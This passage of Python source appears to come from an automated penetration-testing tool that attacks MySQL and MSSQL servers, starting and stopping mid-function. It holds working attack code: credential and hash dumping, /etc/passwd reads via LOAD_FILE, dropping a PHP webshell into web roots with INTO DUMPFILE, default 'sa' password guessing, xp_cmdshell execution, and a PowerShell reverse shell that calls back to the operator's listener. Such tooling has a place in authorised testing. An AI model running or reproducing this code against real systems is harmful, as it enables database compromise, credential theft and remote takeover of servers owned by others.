    creds = _gather_mysql_creds(ip)
    if not creds:
        raise RuntimeError("no MySQL creds — run mysql-creds (r2) first")
    if not (shutil.which("mysql") or shutil.which("mariadb")):
        raise RuntimeError("mysql/mariadb client required for loot (query execution)")

    user = pw = None
    for u, p in creds:
        rc, _o = _mysql_query(ip, port, u, p, "SELECT 1")
        if rc == 0:
            user, pw = u, p
            break
    if user is None:
        raise RuntimeError("stored MySQL creds no longer authenticate — re-run mysql-creds (r2)")

    deadline = time.time() + _MYSQLLOOT_DEADLINE

    def q(sql, t=15):
        return _mysql_query(ip, port, user, pw, sql, timeout=t)

    rc, ctx = q("SELECT current_user(), version(), IFNULL(@@secure_file_priv,'NULL')")
    who = ver = sfp = ""
    if rc == 0 and ctx.strip():
        parts = ctx.strip().split("\t")
        who, ver, sfp = (parts + ["", "", ""])[:3]
    _rc, grants = q("SHOW GRANTS")
    file_priv = bool(re.search(r"\bFILE\b|ALL PRIVILEGES", grants or ""))

    rc, dbs = q("SHOW DATABASES")
    userdbs = [d for d in (dbs.split("\n") if rc == 0 else []) if d and d not in _MYSQL_SYSDB]

    rc, hs = q("SELECT User, authentication_string FROM mysql.user WHERE authentication_string<>''")
    if rc != 0 or not hs.strip():
        rc, hs = q("SELECT User, Password FROM mysql.user WHERE Password<>''")
    hashes = []
    if rc == 0:
        for ln in hs.split("\n"):
            if "\t" in ln:
                u, h = ln.split("\t", 1)
                if h.strip() and h.strip() != "NULL":
                    hashes.append((u.strip(), h.strip()))

    rc, cols = q("SELECT table_schema,table_name,column_name FROM information_schema.columns "
                 "WHERE table_schema NOT IN ('information_schema','performance_schema','sys','mysql') "
                 "AND column_name REGEXP 'pass|pwd|secret|token' LIMIT 40")
    tables = {}
    if rc == 0:
        for ln in cols.split("\n"):
            p = ln.split("\t")
            if len(p) == 3:
                tables.setdefault((p[0], p[1]), []).append(p[2])
    appcreds = []
    for (schema, table), passcols in list(tables.items())[:8]:
        if time.time() > deadline:
            break
        rc, idc = q(f"SELECT column_name FROM information_schema.columns WHERE table_schema='{schema}' "
                    f"AND table_name='{table}' AND column_name REGEXP 'user|email|login|name' LIMIT 1")
        idcol = idc.strip().split("\n")[0] if rc == 0 and idc.strip() else None
        sel = f"`{idcol}`,`{passcols[0]}`" if idcol else f"`{passcols[0]}`"
        rc, rows = q(f"SELECT {sel} FROM `{schema}`.`{table}` LIMIT 5")
        if rc == 0:
            for ln in rows.split("\n"):
                if ln.strip():
                    appcreds.append((f"{schema}.{table}", ln.strip().replace("\t", ":")))

    fileread = None
    if file_priv and sfp in ("", "NULL"):
        rc, pf = q("SELECT LOAD_FILE('/etc/passwd')")
        if rc == 0 and "root:" in (pf or ""):
            fileread = pf.strip().split("\n")[0]

    lines = [f"[*] as {who or user} · {ver} · FILE priv: {'yes' if file_priv else 'no'} · "
             f"secure_file_priv: {sfp or '(empty)'}"]
    for u, h in hashes[:20]:
        lines.append(f"✗ HASH {u} {h[:60]}  (mysql.user — crack: hashcat -m 300)")
    for src, val in appcreds[:20]:
        lines.append(f"✗ CRED {val[:80]}  ({src})")
    if fileread:
        lines.append(f"✗ FILE-READ /etc/passwd — {fileread}")
    for d in userdbs[:20]:
        lines.append(f"· DB {d}")
    if file_priv:
        lines.append("· FILE priv → LOAD_FILE app configs / SSH keys; INTO OUTFILE / UDF RCE (r4)")
    elif not hashes and not appcreds:
        lines.append("· no hashes/app-creds surfaced — check other DBs manually; no FILE priv for RCE")
    return f"MySQL loot — {ip}:{port}\n\n" + "\n".join(lines)


# ── MySQL step 4: RCE — INTO OUTFILE webshell (FILE priv), UDF guidance ────────
_MYSQLRCE_DEADLINE = 90
_MYSQL_HTTP_PORTS = {80, 443, 8080, 8000, 8443, 8888, 5000, 3000}
_MYSQL_WEBROOTS = ["/var/www/html", "/var/www", "/usr/share/nginx/html", "/srv/http",
                   "/var/www/htdocs", "/app/public", "/var/www/html/uploads"]


def _tool_mysql_rce(ip: str, port: int, proto: str) -> str:
    """MySQL step 4 tool: with a FILE-privileged cred, drop a PHP webshell into a served web root
    via SELECT … INTO DUMPFILE and exec-verify it over HTTP with a computed marker (real command
    execution). Reports the working webshell URL (spawn a reverse shell via spawn-shell r1). SQL
    can't delete files, so any drop is left on disk and reported for manual cleanup. UDF RCE stays
    manual (arch-specific .so). Needs a stored cred + mysql client. Authorised targets only."""
    import time
    import os
    import urllib.parse
    creds = _gather_mysql_creds(ip)
    if not creds:
        raise RuntimeError("no MySQL creds — run mysql-creds (r2) first")
    if not (shutil.which("mysql") or shutil.which("mariadb")):
        raise RuntimeError("mysql/mariadb client required for RCE (OUTFILE writes)")
    user = pw = None
    for u, p in creds:
        rc, _o = _mysql_query(ip, port, u, p, "SELECT 1")
        if rc == 0:
            user, pw = u, p
            break
    if user is None:
        raise RuntimeError("stored MySQL creds no longer authenticate — re-run mysql-creds (r2)")

    def q(sql, t=15):
        return _mysql_query(ip, port, user, pw, sql, timeout=t)

    _rc, sfpout = q("SELECT IFNULL(@@secure_file_priv,'NULL')")
    sfp = sfpout.strip()
    _rc, grants = q("SHOW GRANTS")
    file_priv = bool(re.search(r"\bFILE\b|ALL PRIVILEGES", grants or ""))

    lines = [f"[*] FILE priv: {'yes' if file_priv else 'no'} · secure_file_priv: {sfp or '(empty)'}"]
    rce, written = [], []
    if file_priv and sfp == "":
        deadline = time.time() + _MYSQLRCE_DEADLINE
        http_ports = [p for p, pr, _s in fetch_ports(ip) if p in _MYSQL_HTTP_PORTS and pr == "tcp"] or [80]
        payload = b"<?php system($_GET['c']); ?>"
        for wr in _MYSQL_WEBROOTS:
            if time.time() > deadline or rce:
                break
            name = f"pshm_{os.urandom(3).hex()}.php"
            path = f"{wr}/{name}"
            rc, _o = q("SELECT UNHEX('%s') INTO DUMPFILE '%s'" % (payload.hex(), path))
            if rc != 0:
                continue
            written.append(path)
            for hp in http_ports:
                tls = hp in (443, 8443)
                mark = f"PSH{os.urandom(2).hex()}"
                probe = urllib.parse.quote(f"echo {mark}$((6*7))")
                body = _http_get(ip, hp, f"/{name}?c={probe}", tls)
                if body and f"{mark}42" in body:
                    rce.append((f"{'https' if tls else 'http'}://{ip}:{hp}/{name}", path))
                    break

    for url, path in rce:
        lines.append(f"✗ RCE {url} (php system())")
    for path in written:
        if not any(path == pp for _u, pp in rce):
            lines.append(f"⚠ dropped but not served: {path} — rm it manually (SQL can't delete)")
    for _u, path in rce:
        lines.append(f"⚠ webshell left on disk: {path} — rm it manually (SQL can't delete)")
    if rce:
        lines.append("· spawn a reverse shell: Privilege Escalation phase → spawn-shell (r1)")
    else:
        if not file_priv:
            lines.append("· no FILE privilege — OUTFILE RCE unavailable with this cred")
        elif sfp != "":
            lines.append(f"· secure_file_priv={sfp or 'NULL'} blocks arbitrary OUTFILE — RCE limited")
        else:
            lines.append("· FILE priv ok but no writable+served web root hit — try a known web root")
        lines.append("· UDF RCE (manual): INTO DUMPFILE lib_mysqludf_sys.so → @@plugin_dir → "
                     "CREATE FUNCTION sys_exec … SONAME 'lib_mysqludf_sys.so' → sys_exec('cmd')")
    return f"MySQL RCE — {ip}:{port}\n\n" + "\n".join(lines)


def _tool_mysql_shell(ip: str, port: int, proto: str) -> str:
    """MySQL foothold (INTERACTIVE): fire a reverse shell through the webshell mysql-rce confirmed —
    smart auto-upgrading listener on a free local port, then trigger via HTTP (with retries).
    Headless prints the curl. Authorised targets only."""
    import time
    import tempfile
    import urllib.parse
    rout = next((o for s, o in fetch_scripts(ip, port, proto) if s == "mysql-rce"), "")
    mu = re.search(r"^✗ RCE (\S+)", rout, re.M)
    if not mu:
        print(f"\n{YELLOW}no confirmed MySQL webshell{RESET} — run {BOLD}mysql-rce (r4){RESET} first.")
        return "mysql-shell: no confirmed webshell (run mysql-rce r4)"
    url = mu.group(1)
    mm = re.match(r"(https?)://([^:/]+):?(\d+)?(/.*)$", url)
    if not mm:
        return "mysql-shell: could not parse the webshell URL"
    scheme, host, hp, path = mm.group(1), mm.group(2), mm.group(3), mm.group(4)
    tls = scheme == "https"
    web_port = int(hp) if hp else (443 if tls else 80)
    lhost = _foothold_lhost(ip)
    if not lhost:
        print(f"{RED}✗ could not determine our IP toward {ip}{RESET}")
        return "mysql-shell: no LHOST"
    lport = _free_local_port(4444)
    if lport != 4444:
        print(f"{YELLOW}port 4444 in use{RESET}{DIM} — using {BOLD}{lport}{RESET}{DIM} for the listener{RESET}")
    rlabel, _n, rtpl, rpty = _REVSHELLS[0]
    revsh = rtpl.replace("{ip}", lhost).replace("{port}", str(lport))
    path_q = f"{path}?c={urllib.parse.quote(revsh)}"
    upgrade = b"" if rpty else _FOOTHOLD_UPGRADE.encode()
    src = (_SMART_LISTENER_SRC.replace("__LPORT__", str(lport)).replace("__UPGRADE__", repr(upgrade)))
    fd, spath = tempfile.mkstemp(prefix="pshunter_listener_", suffix=".py")
    with os.fdopen(fd, "w") as fh:
        fh.write(src)
    used = _open_listener_terminal(spath)

    def _fire():
        try:
            _http_get(ip, web_port, path_q, tls)
        except Exception:                                    # noqa: BLE001
            pass

    if not used:
        _safe_unlink(spath)
        print(f"{YELLOW}headless{RESET} — start {BOLD}nc -lvnp {lport}{RESET}, then fire:\n  "
              f"{BOLD}curl '{url}?c=<url-encoded reverse shell>'{RESET}")
        return f"mysql-shell: headless — webshell {url}"
    print(f"{GREEN}▶ smart listener opened{RESET} {DIM}({used}) on {lhost}:{lport}{RESET}")
    time.sleep(1.5)
    for _ in range(3):
        _fire()
        time.sleep(1.0)
    print(f"  {DIM}→ check the new terminal for your {GREEN}shell{RESET}{DIM}; "
          f"if nothing landed, re-fire the curl{RESET}")
    return f"mysql-shell: web-rce shell → {lhost}:{lport} (via {url})"


# ── MySQL step 5: manual steps & further research (reference only, context-aware) ─
def _tool_mysql_next(ip: str, port: int, proto: str) -> str:
    """MySQL step-5 tool: NOT a scan — a read-only checklist of where to go on MySQL, with this
    host's own findings substituted in (confirmed RCE or creds to spawn, hashes to crack, app creds
    to reuse, FILE-priv file read/write, phase CVEs, and unconfirmed ⚠ hits). Pure DB synthesis."""
    scripts = fetch_scripts(ip, port, proto)
    by_sid = {}
    for sid, out in scripts:
        by_sid.setdefault(sid, out or "")
    banner, loot, rce = by_sid.get("mysql-banner", ""), by_sid.get("mysql-loot", ""), by_sid.get("mysql-rce", "")

    mv = re.search(r"^\[\*\] Service:\s*(.+)$", banner, re.M)
    ver = mv.group(1).split("·")[0].strip() if mv else ""
    creds = _gather_mysql_creds(ip)
    hashes = re.findall(r"^✗ HASH (.+)$", loot, re.M)
    appcreds = re.findall(r"^✗ CRED (.+)$", loot, re.M)
    dbs = re.findall(r"^· DB (\S+)", loot, re.M)
    file_priv = "FILE priv: yes" in loot or "FILE priv: yes" in rce
    has_rce = "✗ RCE " in rce

    oports = {(p, pr) for p, pr, _s in fetch_ports(ip)}
    reuse_svc = [n for (pnum, n) in ((22, "SSH"), (445, "SMB"), (21, "FTP"), (5985, "WinRM"))
                 if (pnum, "tcp") in oports]

    kev = _load_kev()
    found = set()
    for (p, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
        if p == port and pr == proto and cv:
            found |= {c.strip() for c in cv.split(",") if c.strip()}
    for _sid, out in scripts:
        found |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
    found = sorted(found, key=_cve_sort_key)

    warns = []
    for sid, out in scripts:
        for ln in (out or "").splitlines():
            if ln.strip().startswith("⚠"):
                warns.append(f"{DIM}[{sid}]{RESET} {ln.strip()}")
    warns = warns[:14]

    sub = f"{DIM}version: {ver or 'unknown'}  ·  creds: {len(creds)}  ·  FILE priv: {'yes' if file_priv else 'no'}  ·  RCE: {'yes' if has_rce else 'no'}"
    L = [f"MySQL {ip} — manual steps {DIM}(reference only — nothing is scanned here){RESET}", sub + RESET]

    L.append(f"\n{BOLD}A. Get code exec{RESET}")
    if has_rce:
        L.append(f"  {CYAN}ready{RESET} {DIM}(OUTFILE webshell) → Privilege Escalation phase → spawn-shell (r1){RESET}")
    elif creds and file_priv:
        L.append(f"  {DIM}FILE priv + cred → drop an OUTFILE webshell (mysql-rce r4) or UDF sys_exec{RESET}")
    else:
        L.append(f"  {DIM}need a FILE-priv cred — prove creds (r2); else no OUTFILE/UDF RCE{RESET}")
    L.append(f"  {DIM}UDF: INTO DUMPFILE lib_mysqludf_sys.so → @@plugin_dir → CREATE FUNCTION sys_exec "
             f"SONAME 'lib_mysqludf_sys.so'; mysqld often runs as root → shell as root{RESET}")

    L.append(f"\n{BOLD}B. Crack & reuse{RESET}")
    if hashes:
        L.append(f"  {CYAN}{len(hashes)} mysql.user hash(es){RESET} {DIM}→ hashcat -m 300 (native) / -m 7401 (sha2); "
                 f"cracked → reuse as OS/root creds{RESET}")
    if appcreds:
        L.append(f"  {CYAN}app creds:{RESET} {', '.join(a.split(' ')[0] for a in appcreds[:5])}"
                 + (f" {DIM}+{len(appcreds) - 5}{RESET}" if len(appcreds) > 5 else ""))
    tgt = ", ".join(reuse_svc) if reuse_svc else "SSH / SMB / web-login"
    L.append(f"  {DIM}reuse any recovered password on {tgt} (password reuse across the estate){RESET}")
    if not hashes and not appcreds:
        L.append(f"  {DIM}nothing looted yet — run mysql-loot (r3){RESET}")

    L.append(f"\n{BOLD}C. File read / write (FILE priv){RESET}")
    if file_priv:
        L.append(f"  {CYAN}FILE priv{RESET} {DIM}→ LOAD_FILE('/var/www/.../wp-config.php'), '.env', "
                 f"'/home/*/.ssh/id_rsa', '/etc/shadow'; INTO OUTFILE to writable paths{RESET}")
    else:
        L.append(f"  {DIM}no FILE priv on the current cred — try another user / GRANT via a superuser{RESET}")

    L.append(f"\n{BOLD}D. CVEs surfaced in this phase{RESET}")
    if found:
        for c in found:
            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")
    else:
        L.append(f"  {DIM}none surfaced — searchsploit '{ver or 'mysql <version>'}'{RESET}")

    L.append(f"\n{BOLD}E. Loot recap & pivot{RESET}")
    if dbs:
        L.append(f"  {CYAN}databases:{RESET} {', '.join(dbs[:8])}"
                 + (f" {DIM}+{len(dbs) - 8}{RESET}" if len(dbs) > 8 else ""))
    L.append(f"  {DIM}dump full tables for secrets; connection strings → other DBs/hosts; "
             f"linked-server / federated hops{RESET}")

    L.append(f"\n{BOLD}F. Verify unconfirmed findings from this phase{RESET}")
    if warns:
        for w in warns:
            L.append(f"  {w}")
    else:
        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")

    L.append(f"\n{BOLD}G. Re-run & housekeeping{RESET}")
    L.append(f"  {DIM}crack the mysql.user hashes then reuse; remove any pshm_*.php webshell dropped by "
             f"mysql-rce (SQL can't delete — rm on the box){RESET}")
    return "\n".join(L)


# ══ MS SQL Server (1433 / 1434) ══ the version is discoverable unauthenticated: the SQL Browser
# (UDP 1434, SSRP) advertises instances + version, and the TDS pre-login on 1433 returns version
# bytes. Both are pure stdlib; auth / xp_cmdshell / queries later go through netexec (TDS binary).
_MSSQL_RELEASE = {16: "2022", 15: "2019", 14: "2017", 13: "2016", 12: "2014",
                  11: "2012", 10: "2008", 9: "2005", 8: "2000"}


def _mssql_browser(ip: str, timeout: float = 3.0) -> "dict | None":
    """Query the SQL Server Browser (UDP 1434, SSRP) → {ServerName, InstanceName, Version, tcp}
    for the first instance, or None. Unauthenticated."""
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(b"\x02", (ip, 1434))
        data, _ = s.recvfrom(4096)
    except OSError:
        return None
    finally:
        s.close()
    if len(data) < 3 or data[0] != 0x05:
        return None
    length = data[1] | (data[2] << 8)
    body = data[3:3 + length].decode("latin-1", "replace")
    parts = body.split(";")
    info = {}
    for i in range(0, len(parts) - 1, 2):
        if parts[i] and parts[i] not in info:
            info[parts[i]] = parts[i + 1]
    return info or None


def _mssql_prelogin(ip: str, port: int, timeout: float = 6.0) -> "str | None":
    """Send a TDS PRELOGIN and parse the VERSION token from the response → 'major.minor.build',
    or None. Unauthenticated."""
    import socket
    import struct
    # option table: VERSION(0), ENCRYPTION(1), INSTOPT(2), THREADID(3), MARS(4), TERMINATOR(0xff)
    data = b"\x00" * 6 + b"\x00" + b"\x00" + b"\x00\x00\x00\x00" + b"\x00"
    toks = (b"\x00" + struct.pack(">HH", 26, 6) + b"\x01" + struct.pack(">HH", 32, 1)
            + b"\x02" + struct.pack(">HH", 33, 1) + b"\x03" + struct.pack(">HH", 34, 4)
            + b"\x04" + struct.pack(">HH", 38, 1) + b"\xff")
    payload = toks + data
    pkt = bytes([0x12, 0x01]) + struct.pack(">H", 8 + len(payload)) + b"\x00\x00\x01\x00" + payload
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        s.sendall(pkt)
        resp = s.recv(4096)
    except OSError:
        return None
    finally:
        s.close()
    if len(resp) < 9 or resp[0] != 0x04:
        return None
    body = resp[8:]
    i = 0
    while i + 5 <= len(body):
        tok = body[i]
        if tok == 0xff:
            break
        off, ln = struct.unpack(">H", body[i + 1:i + 3])[0], struct.unpack(">H", body[i + 3:i + 5])[0]
        if tok == 0x00 and off + 4 <= len(body):                # VERSION token
            vb = body[off:off + ln]
            if len(vb) >= 4:
                return f"{vb[0]}.{vb[1]}.{(vb[2] << 8) | vb[3]}"
        i += 5
    return None


def _tool_mssql_banner(ip: str, port: int, proto: str) -> str:
    """MSSQL step 1 tool: fingerprint the server unauthenticated — query the SQL Browser (UDP 1434)
    for instances + version, falling back to a TDS pre-login on the TCP port, map the version to a
    release (2019 = 15.x …), record the service and query Exploit-DB. Read-only, no login. A host
    that answers on neither raises. Authorised targets only."""
    info = _mssql_browser(ip)
    version = (info or {}).get("Version")
    if not version:
        version = _mssql_prelogin(ip, port if port != 1434 else 1433)
    if not version:
        raise RuntimeError(f"{ip} — no MSSQL response (SQL Browser 1434 filtered + TDS pre-login failed)")

    try:
        maj = int(version.split(".")[0])
    except ValueError:
        maj = 0
    release = _MSSQL_RELEASE.get(maj, "")
    product = "Microsoft SQL Server" + (f" {release}" if release else "")
    save_services(ip, [{"port": port, "proto": proto, "name": "mssql",
                        "product": product, "version": version}])

    lines = [f"[*] Service: {product}  ·  version {version}"]
    if info:
        inst = info.get("InstanceName")
        tcp = info.get("tcp")
        if inst:
            lines.append(f"[*] Instance: {inst}" + (f"  ·  tcp {tcp}" if tcp else "")
                         + (f"  ·  {info['ServerName']}" if info.get("ServerName") else ""))

    ss = shutil.which("searchsploit")
    if ss:
        proc = subprocess.run([ss, "-j", "-s", "-t", "Microsoft SQL Server", version],
                              capture_output=True, text=True, timeout=30)
        try:
            rows = json.loads(proc.stdout or "{}").get("RESULTS_EXPLOIT", [])
        except ValueError:
            rows = []
        seen = set()
        for r in rows[:20]:
            edb = str(r.get("EDB-ID", "?"))
            if edb in seen:
                continue
            seen.add(edb)
            lines.append(f"[searchsploit] {(r.get('Title') or '').strip()}  (EDB-{edb})")
            if len(seen) >= 8:
                break
    else:
        lines.append("· searchsploit not installed — check Exploit-DB for the version manually")
    lines.append("· next: sa blank/default + reused creds (mssql-creds r2)")
    return f"MSSQL banner — {ip}:{port}\n\n" + "\n".join(lines)


# ── MSSQL step 2: sa blank/default + reused creds (netexec mssql, SQL auth) ─────
_MSSQLCREDS_DEADLINE = 120
_MSSQLCREDS_MAX = 50
_MSSQL_DEFAULTS = [
    ("sa", ""), ("sa", "sa"), ("sa", "password"), ("sa", "Password1"), ("sa", "P@ssw0rd"),
    ("sa", "sql"), ("sa", "sa123"), ("sa", "admin"), ("sa", "sqlserver"), ("sa", "changeme"),
    ("admin", "admin"), ("sql", "sql"), ("mssql", "mssql"), ("sqladmin", "sqladmin"),
]


def _mssql_nxc_auth(ip: str, port: int, user: str, pw: str) -> "tuple | None":
    """Auth check via netexec mssql (SQL/local auth). Returns (valid, is_sysadmin) or None if
    netexec is absent."""
    nxc = shutil.which("netexec") or shutil.which("nxc")
    if not nxc:
        return None
    try:
        p = subprocess.run([nxc, "mssql", ip, "--port", str(port), "-u", user, "-p", pw,
                            "--local-auth"], capture_output=True, text=True, timeout=45)
        out = re.sub(r"\x1b\[[0-9;]*m", "", (p.stdout or "") + (p.stderr or ""))
    except (OSError, subprocess.SubprocessError):
        return None
    valid = bool(re.search(r"\bMSSQL\b.*\[\+\]", out))
    return (valid, "Pwn3d!" in out)


def _gather_mssql_creds(ip: str) -> list:
    """(user, pass) MSSQL logins mssql-creds proved for this host ('mssql on <ip>')."""
    out = []
    for sid, output in fetch_scripts(ip, 445, "tcp"):
        if sid != "smb-creds":
            continue
        for m in re.finditer(rf"! (\S+?):(\S*) @ mssql on {re.escape(ip)}\b", output or ""):
            out.append((m.group(1), "" if m.group(2) == "<blank>" else m.group(2)))
    return out


def _gather_mssql_admin(ip: str) -> list:
    """(user, pass) MSSQL logins proven sysadmin (can xp_cmdshell) — 'mssql-admin on <ip>'."""
    out = []
    for sid, output in fetch_scripts(ip, 445, "tcp"):
        if sid != "smb-creds":
            continue
        for m in re.finditer(rf"! (\S+?):(\S*) @ mssql-admin on {re.escape(ip)}\b", output or ""):
            out.append((m.group(1), "" if m.group(2) == "<blank>" else m.group(2)))
    return out


def _tool_mssql_creds(ip: str, port: int, proto: str) -> str:
    """MSSQL step 2 tool: try sa with a blank/default password plus a curated set of SQL logins and
    any harvested password (reuse) via netexec mssql (SQL auth) — targeted, not a wordlist brute.
    netexec flags sysadmin logins (Pwn3d!) that can run xp_cmdshell. Valid logins are saved to the
    store ('mssql on <host>', and 'mssql-admin on' when sysadmin). No netexec → raises. Authorised
    targets only."""
    import time
    if not (shutil.which("netexec") or shutil.which("nxc")):
        raise RuntimeError("netexec (nxc) required to test MSSQL creds")

    reused = [(u, s) for _d, u, s in _gather_all_smb_creds()
              if s and not re.fullmatch(r"[a-fA-F0-9]{32}", s)]
    candidates, seen = [], set()
    for u, p in _MSSQL_DEFAULTS + reused:
        key = (u.lower(), p)
        if key not in seen:
            seen.add(key)
            candidates.append((u, p, (u, p) not in _MSSQL_DEFAULTS))
    candidates = candidates[:_MSSQLCREDS_MAX]

    deadline = time.time() + _MSSQLCREDS_DEADLINE
    valid, conn_err = [], 0
    for user, pw, is_reused in candidates:
        if time.time() > deadline:
            break
        r = _mssql_nxc_auth(ip, port, user, pw)
        if r is None:
            conn_err += 1
            if conn_err >= 3:
                raise RuntimeError("netexec mssql not returning results (down / wrong port?)")
            continue
        ok, admin = r
        if ok:
            valid.append((user, pw, is_reused, admin))
            if admin:
                break                                        # a sysadmin login is the jackpot — stop

    if valid:                                                # persist to the canonical creds store
        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
        for user, pw, _r, admin in valid:
            for tag in (["mssql"] + (["mssql-admin"] if admin else [])):
                line = f"! {user}:{pw or '<blank>'} @ {tag} on {ip} [{ip}]"
                blocks.setdefault(ip, [])
                if line not in blocks[ip]:
                    blocks[ip].append(line)
        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)

    lines = [f"[*] {len(candidates)} cred(s) tried (defaults + reuse) · {len(valid)} valid"]
    for user, pw, is_reused, admin in valid:
        tag = "  (sysadmin — xp_cmdshell!)" if admin else ("  (reused)" if is_reused else "")
        lines.append(f"✗ CREDS {user}:{pw or '<blank>'}{tag}")
    if any(a for *_x, a in valid):
        lines.append("· sysadmin → command exec (mssql-exec r3), then spawn-shell (r1)")
    elif valid:
        lines.append("· valid but not sysadmin — enum/loot (r4); try to escalate (EXECUTE AS / linked servers)")
    else:
        lines.append("· no default/reused login worked — domain creds? try Windows auth manually (mssqlclient)")
    return f"MSSQL credentials — {ip}:{port}\n\n" + "\n".join(lines)


# ── MSSQL step 3: xp_cmdshell OS command execution (sysadmin) → foothold ────────
def _mssql_run_cmd(ip: str, port: int, user: str, pw: str, cmd: str, timeout: int = 60) -> tuple:
    """Run an OS command via netexec mssql -x (xp_cmdshell, auto-enabled if sysadmin).
    Returns (rc, ansi-stripped output) or (None, '') if netexec is absent."""
    nxc = shutil.which("netexec") or shutil.which("nxc")
    if not nxc:
        return (None, "")
    try:
        p = subprocess.run([nxc, "mssql", ip, "--port", str(port), "-u", user, "-p", pw,
                            "--local-auth", "-x", cmd], capture_output=True, text=True, timeout=timeout)
        return (p.returncode, re.sub(r"\x1b\[[0-9;]*m", "", (p.stdout or "") + (p.stderr or "")))
    except (OSError, subprocess.SubprocessError):
        return (None, "")


def _tool_mssql_exec(ip: str, port: int, proto: str) -> str:
    """MSSQL step 3 tool: confirm OS command execution via xp_cmdshell over a sysadmin cred
    (netexec auto-enables it), running whoami to prove the channel and its context (often
    nt service\\MSSQLSERVER or SYSTEM). Non-interactive — spawning a reverse shell is spawn-shell
    (r1). No sysadmin cred / no netexec → raises. Authorised targets only."""
    if not (shutil.which("netexec") or shutil.which("nxc")):
        raise RuntimeError("netexec (nxc) required for MSSQL command execution")
    admins = _gather_mssql_admin(ip)
    if not admins:
        raise RuntimeError("no sysadmin MSSQL cred — run mssql-creds (r2) first (need Pwn3d!)")
    user, pw = admins[0]
    rc, out = _mssql_run_cmd(ip, port, user, pw, "whoami", 60)
    if rc is None:
        raise RuntimeError(f"{ip}:{port} — netexec mssql did not run (down / wrong port?)")
    body = _nxc_body(out)
    ctx = ""
    for ln in reversed([l.strip() for l in body.splitlines() if l.strip()]):
        if "\\" in ln or ln.lower() == "system":
            ctx = ln
            break

    lines = [f"[*] xp_cmdshell over {user}"]
    if ctx:
        lines.append(f"✗ EXEC command execution confirmed — running as {ctx}")
        lines.append("· spawn a reverse shell: Privilege Escalation phase → spawn-shell (r1)")
    else:
        lines.append("· xp_cmdshell returned no context — enable it manually "
                     "(EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE) or check the cred is sysadmin")
    return f"MSSQL exec — {ip}:{port}\n\n" + "\n".join(lines)


# PowerShell TCP reverse shell (base64 for `powershell -e`), fired through xp_cmdshell.
_MSSQL_PS_REVSHELL = (
    "$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();"
    "[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
    "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
    "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
    "$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()")


def _tool_mssql_shell(ip: str, port: int, proto: str) -> str:
    """MSSQL foothold (INTERACTIVE): spawn a listener and fire a PowerShell reverse shell through
    xp_cmdshell over a sysadmin cred (netexec -x). Headless prints the listener + trigger.
    Authorised targets only."""
    import base64
    import time
    if not (shutil.which("netexec") or shutil.which("nxc")):
        print(f"\n{RED}✗ netexec not installed{RESET} — needed to fire the shell via xp_cmdshell.")
        return "mssql-shell: netexec not installed"
    admins = _gather_mssql_admin(ip)
    if not admins:
        print(f"\n{YELLOW}no sysadmin MSSQL cred{RESET} — run {BOLD}mssql-creds (r2){RESET} first.")
        return "mssql-shell: no sysadmin cred (run mssql-creds r2)"
    if len(admins) == 1:
        user, pw = admins[0]
    else:
        print(f"\n{BOLD}sysadmin creds{RESET}")
        for i, (u, _p) in enumerate(admins, 1):
            print(f"  {BOLD}{i}{RESET}  {u}")
        v = _ask("pick cred [1-N, blank = 1]:")
        user, pw = admins[int(v) - 1] if (v and v.isdigit() and 1 <= int(v) <= len(admins)) else admins[0]

    lhost = _foothold_lhost(ip)
    if not lhost:
        print(f"{RED}✗ could not determine our IP toward {ip}{RESET}")
        return "mssql-shell: no LHOST"
    lport = _free_local_port(4444)
    if lport != 4444:
        print(f"{YELLOW}port 4444 in use{RESET}{DIM} — using {BOLD}{lport}{RESET}{DIM} for the listener{RESET}")
    ps = _MSSQL_PS_REVSHELL.format(ip=lhost, port=lport)
    b64 = base64.b64encode(ps.encode("utf-16-le")).decode()
    pscmd = f"powershell -nop -w hidden -e {b64}"
    nxc = shutil.which("netexec") or shutil.which("nxc")

    term = _open_shell_terminal(f"nc -lvnp {lport}")
    if not term:
        print(f"{YELLOW}headless{RESET} — start {BOLD}nc -lvnp {lport}{RESET}, then fire:\n  "
              f"{BOLD}{nxc} mssql {ip} --port {port} -u {user} -p '{pw}' --local-auth -x '{pscmd}'{RESET}")
        return f"mssql-shell: headless — trigger shown ({user}@{ip})"
    print(f"{GREEN}▶ listener nc -lvnp {lport} in a new {term} window{RESET} {DIM}(LHOST {lhost}){RESET}")

    def _fire():
        try:
            subprocess.Popen([nxc, "mssql", ip, "--port", str(port), "-u", user, "-p", pw,
                              "--local-auth", "-x", pscmd], stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, start_new_session=True)
        except OSError:
            pass
    time.sleep(1.5)
    for _ in range(2):
        _fire()
        time.sleep(2.0)
    print(f"  {DIM}→ check the new terminal for your {GREEN}shell{RESET}{DIM} (xp_cmdshell → PowerShell){RESET}")
    return f"mssql-shell: shell → {user}@{ip}:{lport}"


# ── MSSQL step 4: loot — databases, linked servers, sql_login hashes, OPENROWSET ──
_MSSQL_SYSDB = ("master", "tempdb", "model", "msdb")


def _mssql_q(ip: str, port: int, user: str, pw: str, sql: str, timeout: int = 45) -> tuple:
    """Run a SQL query via netexec mssql -q. Returns (rc, ansi-stripped output) or (None, '')."""
    nxc = shutil.which("netexec") or shutil.which("nxc")
    if not nxc:
        return (None, "")
    try:
        p = subprocess.run([nxc, "mssql", ip, "--port", str(port), "-u", user, "-p", pw,
                            "--local-auth", "-q", sql], capture_output=True, text=True, timeout=timeout)
